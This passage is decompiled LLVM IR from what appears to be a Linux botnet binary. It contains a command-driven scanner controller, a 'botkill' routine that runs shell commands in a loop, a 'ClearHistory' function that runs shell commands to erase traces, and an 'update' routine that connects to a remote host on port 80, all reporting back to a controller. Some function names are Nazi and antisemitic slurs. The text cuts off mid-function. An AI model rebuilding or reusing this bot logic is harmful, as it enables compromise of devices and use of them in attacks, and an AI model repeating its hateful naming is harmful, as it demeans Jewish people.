  %v2_1000dca4 = load i32, i32* %v1_1000dc2c, align 16
  store i32 268491964, i32* @lr, align 4
  %v3_1000dcb8 = call i32 @connect(i32 %v2_1000dca4, i32 %v2_1000d890, i32 16)
  %v4_1000dcc4 = icmp eq i32 %v3_1000dcb8, -1
  br i1 %v4_1000dcc4, label %dec_label_pc_1000dccc, label %dec_label_pc_1000dcfc

dec_label_pc_1000dccc:                            ; preds = %dec_label_pc_1000dc3c
  %v0_1000dccc = call i32 @__errno_location()
  %v1_1000dcd4 = inttoptr i32 %v0_1000dccc to i32*
  %v2_1000dcd4 = load i32, i32* %v1_1000dcd4, align 4
  %v3_1000dcd8 = icmp eq i32 %v2_1000dcd4, 115
  br i1 %v3_1000dcd8, label %dec_label_pc_1000dcfc, label %dec_label_pc_1000dce0

dec_label_pc_1000dce0:                            ; preds = %dec_label_pc_1000dccc
  store i32 ptrtoint (i32* @global_var_1000dcf8.517 to i32), i32* @lr, align 4
  %v2_1000dcf4 = call i32 @reset_ipstate(i32 %v2_1000d9c0, i32 %v1_1000d8fc)
  br label %dec_label_pc_1000eb84

dec_label_pc_1000dcfc:                            ; preds = %dec_label_pc_1000dc3c, %dec_label_pc_1000dccc
  %v3_1000dd14 = call i32 @advance_state(i32* nonnull %v1_1000dc2c, i32 1)
  br label %dec_label_pc_1000eb84

dec_label_pc_1000eb84:                            ; preds = %dec_label_pc_1000dba8, %dec_label_pc_1000d9fc, %dec_label_pc_1000dcfc, %dec_label_pc_1000dce0, %dec_label_pc_1000db2c
  %v1_1000eb88 = add nuw nsw i32 %storemerge48, 1
  %v2_1000eb98 = icmp slt i32 %v1_1000eb88, %stack_var_-596.0
  br i1 %v2_1000eb98, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d9a8

dec_label_pc_1000eba4:                            ; preds = %entry
  %v2_1000eba4 = load i32, i32* %stack_var_-640, align 4
  store i32 %v2_1000eba4, i32* @r11, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000eb88, { 1, 0 }
  uselistorder i8 %v3_1000da0c, { 1, 0 }
  uselistorder i32 %v2_1000d9c0, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1000d990, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_1000d8fc, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 %stack_var_-596.0, { 2, 3, 1, 4, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fcntl, { 9, 8, 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder i32 (i32)* @init_rand, { 12, 11, 10, 9, 8, 7, 6, 1, 0, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_1000eb84, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_1000dcfc, { 1, 0 }
  uselistorder label %dec_label_pc_1000dba8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d9fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d938, { 1, 0 }
  uselistorder label %dec_label_pc_1000d878, { 1, 0 }
}

define i32 @SeigHeil(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268495856, i32* @lr, align 4
  %v0_1000ebec = call i32 @fork()
  store i32 268495872, i32* @lr, align 4
  %v1_1000ebfc = call i32 @sysconf(i32 84)
  %v1_1000ec0c = mul i32 %v1_1000ebfc, 64
  %v3_1000ec20 = icmp eq i32 %v0_1000ebec, 0
  br i1 %v3_1000ec20, label %dec_label_pc_1000ec38, label %dec_label_pc_1000ec28

dec_label_pc_1000ec28:                            ; preds = %entry
  store i32 %v0_1000ebec, i32* @global_var_10045148.571, align 4
  br label %dec_label_pc_1000ec80

dec_label_pc_1000ec38:                            ; preds = %entry
  %v2_1000ec782 = icmp sgt i32 %v1_1000ebfc, 0
  br i1 %v2_1000ec782, label %dec_label_pc_1000ec54, label %dec_label_pc_1000ec80

dec_label_pc_1000ec54:                            ; preds = %dec_label_pc_1000ec38, %dec_label_pc_1000ec54
  %storemerge15 = phi i32 [ %v1_1000ec68, %dec_label_pc_1000ec54 ], [ 0, %dec_label_pc_1000ec38 ]
  %v4_1000ec60 = call i32 @BurnTheJews(i32 370, i32 %v1_1000ec0c, i32 %arg1, i32 %v1_1000ebfc)
  %v1_1000ec68 = add nuw nsw i32 %storemerge15, 1
  %v2_1000ec78 = icmp slt i32 %v1_1000ec68, %v1_1000ebfc
  br i1 %v2_1000ec78, label %dec_label_pc_1000ec54, label %dec_label_pc_1000ec80

dec_label_pc_1000ec80:                            ; preds = %dec_label_pc_1000ec54, %dec_label_pc_1000ec38, %dec_label_pc_1000ec28
  %v0_1000ec94 = phi i32 [ %v1_1000ebfc, %dec_label_pc_1000ec28 ], [ %v1_1000ebfc, %dec_label_pc_1000ec38 ], [ %v4_1000ec60, %dec_label_pc_1000ec54 ]
  ret i32 %v0_1000ec94

; uselistorder directives
  uselistorder i32 %v1_1000ec68, { 1, 0 }
  uselistorder i32 %v1_1000ebfc, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 %v0_1000ebec, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec54, { 1, 0 }
}

define i32 @doScanner(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1000ecc0 = icmp sgt i32 %arg3, 0
  br i1 %v2_1000ecc0, label %dec_label_pc_1000ece4, label %dec_label_pc_1000ecc8

dec_label_pc_1000ecc8:                            ; preds = %entry
  %v6_1000ecdc = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002bd54.572 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eed8

dec_label_pc_1000ece4:                            ; preds = %entry
  %v1_1000ece8 = add i32 %arg4, 4
  %v1_1000ecec = inttoptr i32 %v1_1000ece8 to i32*
  %v2_1000ecec = load i32, i32* %v1_1000ecec, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002bd74.574 to i32), i32* @r4, align 4
  %v3_1000ecfc = inttoptr i32 %v2_1000ecec to i8*
  %v4_1000ecfc = call i32 @__GI_strcoll(i8* %v3_1000ecfc, i32 ptrtoint ([3 x i8]* @global_var_1002bd74.574 to i32))
  %v3_1000ed04 = icmp eq i32 %v4_1000ecfc, 0
  br i1 %v3_1000ed04, label %dec_label_pc_1000ed34, label %dec_label_pc_1000ed0c

dec_label_pc_1000ed0c:                            ; preds = %dec_label_pc_1000ece4
  %v2_1000ed14 = load i32, i32* %v1_1000ecec, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1002bd78.575 to i32), i32* @r4, align 4
  %v3_1000ed24 = inttoptr i32 %v2_1000ed14 to i8*
  %v4_1000ed24 = call i32 @__GI_strcoll(i8* %v3_1000ed24, i32 ptrtoint ([3 x i8]* @global_var_1002bd78.575 to i32))
  %v3_1000ed2c = icmp eq i32 %v4_1000ed24, 0
  br i1 %v3_1000ed2c, label %dec_label_pc_1000ed34, label %dec_label_pc_1000edc8

dec_label_pc_1000ed34:                            ; preds = %dec_label_pc_1000ed0c, %dec_label_pc_1000ece4
  %v3_1000ed38 = load i32, i32* @global_var_10045148.571, align 4
  %v3_1000ed3c = icmp eq i32 %v3_1000ed38, 0
  br i1 %v3_1000ed3c, label %dec_label_pc_1000ed44, label %dec_label_pc_1000eda4

dec_label_pc_1000ed44:                            ; preds = %dec_label_pc_1000ed34
  store i32 268496204, i32* @lr, align 4
  %v2_1000ed48 = call i32 @SeigHeil(i32 %arg1, i32 268697600)
  %v3_1000ed50 = load i32, i32* @global_var_10045148.571, align 4
  %v3_1000ed54 = icmp eq i32 %v3_1000ed50, 0
  %v3_1000ed84 = load i32, i32* @global_var_100451a4.544, align 4
  br i1 %v3_1000ed54, label %dec_label_pc_1000ed80, label %dec_label_pc_1000ed5c

dec_label_pc_1000ed5c:                            ; preds = %dec_label_pc_1000ed44
  %v6_1000ed78 = call i32 @Send(i32 %arg1, i32 ptrtoint ([43 x i8]* @global_var_1002bd7c.576 to i32), i32 %v3_1000ed84, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eed8

dec_label_pc_1000ed80:                            ; preds = %dec_label_pc_1000ed44
  %v6_1000ed9c = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_1002bda8.578 to i32), i32 %v3_1000ed84, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eed8

dec_label_pc_1000eda4:                            ; preds = %dec_label_pc_1000ed34
  %v3_1000eda8 = load i32, i32* @global_var_100451a4.544, align 4
  %v6_1000edc0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([51 x i8]* @global_var_1002bddc.580 to i32), i32 %v3_1000eda8, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eed8

dec_label_pc_1000edc8:                            ; preds = %dec_label_pc_1000ed0c
  %v2_1000edd0 = load i32, i32* %v1_1000ecec, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002be10.582 to i32), i32* @r4, align 4
  %v3_1000ede0 = inttoptr i32 %v2_1000edd0 to i8*
  %v4_1000ede0 = call i32 @__GI_strcoll(i8* %v3_1000ede0, i32 ptrtoint ([4 x i8]* @global_var_1002be10.582 to i32))
  %v3_1000ede8 = icmp eq i32 %v4_1000ede0, 0
  br i1 %v3_1000ede8, label %dec_label_pc_1000ee18, label %dec_label_pc_1000edf0

dec_label_pc_1000edf0:                            ; preds = %dec_label_pc_1000edc8
  %v2_1000edf8 = load i32, i32* %v1_1000ecec, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002be14.583 to i32), i32* @r4, align 4
  %v3_1000ee08 = inttoptr i32 %v2_1000edf8 to i8*
  %v4_1000ee08 = call i32 @__GI_strcoll(i8* %v3_1000ee08, i32 ptrtoint ([4 x i8]* @global_var_1002be14.583 to i32))
  %v3_1000ee10 = icmp eq i32 %v4_1000ee08, 0
  br i1 %v3_1000ee10, label %dec_label_pc_1000ee18, label %dec_label_pc_1000eec0

dec_label_pc_1000ee18:                            ; preds = %dec_label_pc_1000edf0, %dec_label_pc_1000edc8
  %v3_1000ee1c = load i32, i32* @global_var_10045148.571, align 4
  %v3_1000ee20 = icmp eq i32 %v3_1000ee1c, 0
  br i1 %v3_1000ee20, label %dec_label_pc_1000ee9c, label %dec_label_pc_1000ee28

dec_label_pc_1000ee28:                            ; preds = %dec_label_pc_1000ee18
  store i32 268496444, i32* @lr, align 4
  %v2_1000ee38 = call i32 @kill(i32 %v3_1000ee1c, i32 9)
  %v3_1000ee40 = icmp eq i32 %v2_1000ee38, 0
  %v3_1000ee4c = load i32, i32* @global_var_100451a4.544, align 4
  br i1 %v3_1000ee40, label %dec_label_pc_1000ee48, label %dec_label_pc_1000ee78

dec_label_pc_1000ee48:                            ; preds = %dec_label_pc_1000ee28
  %v6_1000ee64 = call i32 @Send(i32 %arg1, i32 ptrtoint ([42 x i8]* @global_var_1002be18.584 to i32), i32 %v3_1000ee4c, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 0, i32* @global_var_10045148.571, align 4
  br label %dec_label_pc_1000eed8

dec_label_pc_1000ee78:                            ; preds = %dec_label_pc_1000ee28
  %v6_1000ee94 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_1002be44.585 to i32), i32 %v3_1000ee4c, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eed8

dec_label_pc_1000ee9c:                            ; preds = %dec_label_pc_1000ee18
  %v3_1000eea0 = load i32, i32* @global_var_100451a4.544, align 4
  %v6_1000eeb8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([47 x i8]* @global_var_1002be78.587 to i32), i32 %v3_1000eea0, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eed8

dec_label_pc_1000eec0:                            ; preds = %dec_label_pc_1000edf0
  %v6_1000eed4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002bd54.572 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000eed8

dec_label_pc_1000eed8:                            ; preds = %dec_label_pc_1000ee9c, %dec_label_pc_1000ee78, %dec_label_pc_1000ee48, %dec_label_pc_1000eda4, %dec_label_pc_1000ed80, %dec_label_pc_1000ed5c, %dec_label_pc_1000ecc8, %dec_label_pc_1000eec0
  %v0_1000eeec = phi i32 [ %v6_1000eeb8, %dec_label_pc_1000ee9c ], [ %v6_1000ee94, %dec_label_pc_1000ee78 ], [ %v6_1000ee64, %dec_label_pc_1000ee48 ], [ %v6_1000edc0, %dec_label_pc_1000eda4 ], [ %v6_1000ed9c, %dec_label_pc_1000ed80 ], [ %v6_1000ed78, %dec_label_pc_1000ed5c ], [ %v6_1000ecdc, %dec_label_pc_1000ecc8 ], [ %v6_1000eed4, %dec_label_pc_1000eec0 ]
  ret i32 %v0_1000eeec

; uselistorder directives
  uselistorder i32 %v3_1000ee4c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 3, 2, 5, 7, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000eed8, { 7, 0, 1, 2, 3, 4, 5, 6 }
}

define i32 @botkill() local_unnamed_addr {
entry:
  %stack_var_-548 = alloca i32, align 4
  store i32 268496652, i32* @lr, align 4
  %v0_1000ef08 = call i32 @fork()
  %v3_1000ef10 = icmp eq i32 %v0_1000ef08, 0
  br i1 %v3_1000ef10, label %dec_label_pc_1000eff4, label %dec_label_pc_1000ef18.preheader

dec_label_pc_1000ef18.preheader:                  ; preds = %entry
  %v2_1000ef9c = ptrtoint i32* %stack_var_-548 to i32
  br label %dec_label_pc_1000ef18

dec_label_pc_1000ef18:                            ; preds = %dec_label_pc_1000ef24, %dec_label_pc_1000ef18.preheader
  br label %dec_label_pc_1000ef24

dec_label_pc_1000ef24:                            ; preds = %dec_label_pc_1000ef18, %dec_label_pc_1000ef24
  %storemerge12 = phi i32 [ 0, %dec_label_pc_1000ef18 ], [ %v1_1000efdc, %dec_label_pc_1000ef24 ]
  store i32 %v2_1000ef9c, i32* @r3, align 4
  store i32 268496836, i32* @lr, align 4
  %v1_1000efc0 = call i32 @sprintf(i32 %v2_1000ef9c)
  store i32 ptrtoint ([3 x i8]* @global_var_1000efd0.704 to i32), i32* @lr, align 4
  %v1_1000efcc = call i32 @system(i32 %v2_1000ef9c)
  store i32 268496856, i32* @lr, align 4
  %v1_1000efd4 = call i32 @sleep(i32 1)
  %v1_1000efdc = add nuw nsw i32 %storemerge12, 1
  %tmp9 = icmp ult i32 %v1_1000efdc, 114
  br i1 %tmp9, label %dec_label_pc_1000ef24, label %dec_label_pc_1000ef18

dec_label_pc_1000eff4:                            ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000ef9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ef24, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000f010 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000f010, i32* %stack_var_-16, align 4
  %v5_1000f010 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v5_1000f010, i32* @r31, align 4
  store i32 268496944, i32* @lr, align 4
  %v2_1000f02c = call i32 @system(i32 ptrtoint ([22 x i8]* @global_var_1002bf24.705 to i32))
  store i32 268496956, i32* @lr, align 4
  %v2_1000f038 = call i32 @system(i32 ptrtoint ([29 x i8]* @global_var_1002bf3c.706 to i32))
  store i32 268496968, i32* @lr, align 4
  %v2_1000f044 = call i32 @system(i32 ptrtoint ([21 x i8]* @global_var_1002bf5c.707 to i32))
  ret i32 %v2_1000f044

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @dns2ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_1000f088 = call i32 @mfork(i32 %arg2)
  %v3_1000f090 = icmp eq i32 %v1_1000f088, 0
  br i1 %v3_1000f090, label %dec_label_pc_1000f098, label %dec_label_pc_1000f148

dec_label_pc_1000f098:                            ; preds = %entry
  %v3_1000f09c = icmp eq i32 %arg3, 1
  br i1 %v3_1000f09c, label %dec_label_pc_1000f0a4, label %dec_label_pc_1000f128

dec_label_pc_1000f0a4:                            ; preds = %dec_label_pc_1000f098
  %v1_1000f0a8 = add i32 %arg4, 4
  %v1_1000f0ac = inttoptr i32 %v1_1000f0a8 to i32*
  %v2_1000f0ac = load i32, i32* %v1_1000f0ac, align 4
  store i32 268497080, i32* @lr, align 4
  %v1_1000f0b4 = call i32 @__GI_gethostbyname(i32 %v2_1000f0ac)
  %v1_1000f0bc = add i32 %v1_1000f0b4, 16
  %v2_1000f0bc = inttoptr i32 %v1_1000f0bc to i32*
  %v3_1000f0bc = load i32, i32* %v2_1000f0bc, align 4
  %v1_1000f0c0 = inttoptr i32 %v3_1000f0bc to i32*
  %v2_1000f0c0 = load i32, i32* %v1_1000f0c0, align 4
  %v1_1000f0c8 = inttoptr i32 %v2_1000f0c0 to i32*
  %v2_1000f0c8 = load i32, i32* %v1_1000f0c8, align 4
  store i32 %v2_1000f0c8, i32* %stack_var_-24, align 4
  store i32 268497116, i32* @lr, align 4
  %v3_1000f0d8 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-24, i32 %v2_1000f0c0)
  %v2_1000f0e0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v3_1000f0d8, i32* @r4, align 4
  store i32 268497140, i32* @lr, align 4
  %v3_1000f0f0 = call i32 @strncpy(i32 %v2_1000f0e0, i32 %v3_1000f0d8, i32 16)
  %v2_1000f0fc = load i32, i32* %v1_1000f0ac, align 4
  %v7_1000f120 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002bf74.708 to i32), i32 %arg2, i32 %v2_1000f0fc)
  br label %dec_label_pc_1000f140

dec_label_pc_1000f128:                            ; preds = %dec_label_pc_1000f098
  %v6_1000f13c = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002bf94.710 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000f140

dec_label_pc_1000f140:                            ; preds = %dec_label_pc_1000f0a4, %dec_label_pc_1000f128
  %v0_1000f144 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f148

dec_label_pc_1000f148:                            ; preds = %entry, %dec_label_pc_1000f140
  %v0_1000f15c = phi i32 [ %v1_1000f088, %entry ], [ %v0_1000f144, %dec_label_pc_1000f140 ]
  ret i32 %v0_1000f15c

; uselistorder directives
  uselistorder label %dec_label_pc_1000f148, { 1, 0 }
  uselistorder label %dec_label_pc_1000f140, { 1, 0 }
}

define i32 @update(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-5256 = alloca i32, align 4
  %stack_var_-4136 = alloca i32, align 4
  %stack_var_-5160 = alloca i32, align 4
  %stack_var_-5168 = alloca i32, align 4
  %stack_var_-5172 = alloca i32, align 4
  %stack_var_-5176 = alloca i32, align 4
  %stack_var_-5264 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000f160 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000f160, i32* %stack_var_-5264, align 4
  store i32 268497292, i32* @lr, align 4
  %v0_1000f188 = call i32 @__libc_getpid()
  %v1_1000f198 = call i32 @mfork(i32 %arg2)
  %v3_1000f1a0 = icmp eq i32 %v1_1000f198, 0
  br i1 %v3_1000f1a0, label %dec_label_pc_1000f1a8, label %dec_label_pc_1000fb10

dec_label_pc_1000f1a8:                            ; preds = %entry
  %v2_1000f1ac = icmp sgt i32 %arg3, 1
  br i1 %v2_1000f1ac, label %dec_label_pc_1000f1d4, label %dec_label_pc_1000f1b4

dec_label_pc_1000f1b4:                            ; preds = %dec_label_pc_1000f1a8
  %v6_1000f1c8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_1002bfb0.712 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f1d0 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f1d4

dec_label_pc_1000f1d4:                            ; preds = %dec_label_pc_1000f1a8, %dec_label_pc_1000f1b4
  store i32 268497380, i32* @lr, align 4
  %v3_1000f1e0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_1000f1f4 = icmp eq i32 %v3_1000f1e0, -1
  br i1 %v4_1000f1f4, label %dec_label_pc_1000f1fc, label %dec_label_pc_1000f21c

dec_label_pc_1000f1fc:                            ; preds = %dec_label_pc_1000f1d4
  %v6_1000f210 = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_1002bfd8.715 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f218 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f21c

dec_label_pc_1000f21c:                            ; preds = %dec_label_pc_1000f1d4, %dec_label_pc_1000f1fc
  store i32 2, i32* %stack_var_-5176, align 4
  store i32 80, i32* @r3, align 4
  %v1_1000f228 = call i32 @htons(i32 80)
  %v1_1000f238 = add i32 %arg4, 4
  %v1_1000f23c = inttoptr i32 %v1_1000f238 to i32*
  %v2_1000f23c = load i32, i32* %v1_1000f23c, align 4
  store i32 268497480, i32* @lr, align 4
  %v1_1000f244 = call i32 @inet_addr(i32 %v2_1000f23c)
  %v4_1000f258 = icmp eq i32 %v1_1000f244, -1
  br i1 %v4_1000f258, label %dec_label_pc_1000f260, label %dec_label_pc_1000f2dc

dec_label_pc_1000f260:                            ; preds = %dec_label_pc_1000f21c
  %v2_1000f268 = load i32, i32* %v1_1000f23c, align 4
  store i32 268497524, i32* @lr, align 4
  %v1_1000f270 = call i32 @__GI_gethostbyname(i32 %v2_1000f268)
  %v3_1000f280 = icmp eq i32 %v1_1000f270, 0
  br i1 %v3_1000f280, label %dec_label_pc_1000f288, label %dec_label_pc_1000f2a8

dec_label_pc_1000f288:                            ; preds = %dec_label_pc_1000f260
  %v6_1000f29c = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a12c.42 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f2a4 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f2a8

dec_label_pc_1000f2a8:                            ; preds = %dec_label_pc_1000f260, %dec_label_pc_1000f288
  %v2_1000f2ac = ptrtoint i32* %stack_var_-5172 to i32
  %v1_1000f2b4 = add i32 %v1_1000f270, 16
  %v2_1000f2b4 = inttoptr i32 %v1_1000f2b4 to i32*
  %v3_1000f2b4 = load i32, i32* %v2_1000f2b4, align 4
  %v1_1000f2b8 = inttoptr i32 %v3_1000f2b4 to i32*
  %v2_1000f2b8 = load i32, i32* %v1_1000f2b8, align 4
  store i32 %v2_1000f2b8, i32* %r11.global-to-local, align 4
  %v1_1000f2c0 = add i32 %v1_1000f270, 12
  %v2_1000f2c0 = inttoptr i32 %v1_1000f2c0 to i32*
  %v3_1000f2c0 = load i32, i32* %v2_1000f2c0, align 4
  store i32 %v2_1000f2ac, i32* @r3, align 4
  store i32 %v2_1000f2b8, i32* @r4, align 4
  store i32 %v3_1000f2c0, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000f2d8.720 to i32), i32* @lr, align 4
  %v0_1000f2d4 = call i32 @memcpy()
  br label %dec_label_pc_1000f2e4

dec_label_pc_1000f2dc:                            ; preds = %dec_label_pc_1000f21c
  store i32 %v1_1000f244, i32* %stack_var_-5172, align 4
  br label %dec_label_pc_1000f2e4

dec_label_pc_1000f2e4:                            ; preds = %dec_label_pc_1000f2a8, %dec_label_pc_1000f2dc
  %v2_1000f2e4.pre-phi = ptrtoint i32* %stack_var_-5176 to i32
  %v2_1000f2e8 = ptrtoint i32* %stack_var_-5168 to i32
  store i32 %v2_1000f2e8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268497660, i32* @lr, align 4
  %v0_1000f2f8 = call i32 @__GI_memset()
  store i32 268497680, i32* @lr, align 4
  %v3_1000f30c = call i32 @connect(i32 %v3_1000f1e0, i32 %v2_1000f2e4.pre-phi, i32 16)
  %v3_1000f314 = icmp eq i32 %v3_1000f30c, 0
  br i1 %v3_1000f314, label %dec_label_pc_1000f33c, label %dec_label_pc_1000f31c

dec_label_pc_1000f31c:                            ; preds = %dec_label_pc_1000f2e4
  %v6_1000f330 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002a154.46 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000f338 = call i32 @__GI_exit()
  br label %dec_label_pc_1000f33c

dec_label_pc_1000f33c:                            ; preds = %dec_label_pc_1000f2e4, %dec_label_pc_1000f31c
  store i32 268497744, i32* @lr, align 4
  %v6_1000f34c = call i32 @popen(i32 ptrtoint ([11 x i8]* @global_var_1002c038.722 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1002a6e0.110, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_1000f35c = icmp eq i32 %v6_1000f34c, 0
  br i1 %v3_1000f35c, label %dec_label_pc_1000f3cc, label %dec_label_pc_1000f364

dec_label_pc_1000f364:                            ; preds = %dec_label_pc_1000f33c
  %v2_1000f364 = ptrtoint i32* %stack_var_-5160 to i32
  store i32 %v2_1000f364, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268497784, i32* @lr, align 4
  %v0_1000f374 = call i32 @__GI_memset()
  store i32 268497804, i32* @lr, align 4
  %v3_1000f388 = call i32 @fgets(i32 %v2_1000f364, i32 1024, i32 %v6_1000f34c)
  store i32 268497824, i32* @lr, align 4
  %v6_1000f39c = call i32 @strstr(i32 %v2_1000f364, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1002c044.723, i32 0, i32 0), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_1000f3a4 = icmp ne i32 %v6_1000f39c, 0
  %.19 = zext i1 %v3_1000f3a4 to i8
  store i32 ptrtoint (i32* @global_var_1000f3c8.724 to i32), i32* @lr, align 4
  %v1_1000f3c4 = call i32 @pclose(i32 %v6_1000f34c)
  br label %dec_label_pc_1000f3ec.preheader

dec_label_pc_1000f3cc:                            ; preds = %dec_label_pc_1000f33c
  br label %dec_label_pc_1000f3ec.preheader

dec_label_pc_1000f3ec.preheader:                  ; preds = %dec_label_pc_1000f364, %dec_label_pc_1000f3cc
  %stack_var_-5196.0.ph = phi i8 [ %.19, %dec_label_pc_1000f364 ], [ 0, %dec_label_pc_1000f3cc ]
  %v1_1000f3f4 = add i32 %arg4, 8
  %v1_1000f3f8 = inttoptr i32 %v1_1000f3f4 to i32*
  br label %dec_label_pc_1000f3ec

dec_label_pc_1000f3e0:                            ; preds = %dec_label_pc_1000f410
  %v1_1000f3e4 = add i32 %storemerge11, 1
  br label %dec_label_pc_1000f3ec

dec_label_pc_1000f3ec:                            ; preds = %dec_label_pc_1000f3ec.preheader, %dec_label_pc_1000f3e0
  %storemerge11 = phi i32 [ %v1_1000f3e4, %dec_label_pc_1000f3e0 ], [ 0, %dec_label_pc_1000f3ec.preheader ]
  %v2_1000f3f8 = load i32, i32* %v1_1000f3f8, align 4
  store i32 %v2_1000f3f8, i32* @r3, align 4
  %v0_1000f400 = call i32 @__GI_strlen()
  %v2_1000f408 = icmp ult i32 %storemerge11, %v0_1000f400
  br i1 %v2_1000f408, label %dec_label_pc_1000f410, label %dec_label_pc_1000f434

dec_label_pc_1000f410:                            ; preds = %dec_label_pc_1000f3ec
  %v2_1000f418 = load i32, i32* %v1_1000f3f8, align 4
  %v2_1000f420 = add i32 %v2_1000f418, %storemerge11
  %v1_1000f424 = inttoptr i32 %v2_1000f420 to i8*
  %v2_1000f424 = load i8, i8* %v1_1000f424, align 1
  %v3_1000f42c = icmp eq i8 %v2_1000f424, 58
  br i1 %v3_1000f42c, label %dec_label_pc_1000f434, label %dec_label_pc_1000f3e0

dec_label_pc_1000f434:                            ; preds = %dec_label_pc_1000f410, %dec_label_pc_1000f3ec
  %v2_1000f43c = load i32, i32* %v1_1000f3f8, align 4
  %v2_1000f444 = add i32 %v2_1000f43c, %storemerge11
  %v3_1000f44c = inttoptr i32 %v2_1000f444 to i8*
  store i8 0, i8* %v3_1000f44c, align 1
  %v3_1000f458 = icmp eq i8 %stack_var_-5196.0.ph, 0
  %v2_1000f47c = load i32, i32* %v1_1000f3f8, align 4
  br i1 %v3_1000f458, label %dec_label_pc_1000f474, label %dec_label_pc_1000f490

dec_label_pc_1000f474:                            ; preds = %dec_label_pc_1000f434
  %v2_1000f484 = add i32 %v2_1000f47c, %storemerge11
  %v1_1000f488 = add i32 %v2_1000f484, 1
  br label %dec_label_pc_1000f490

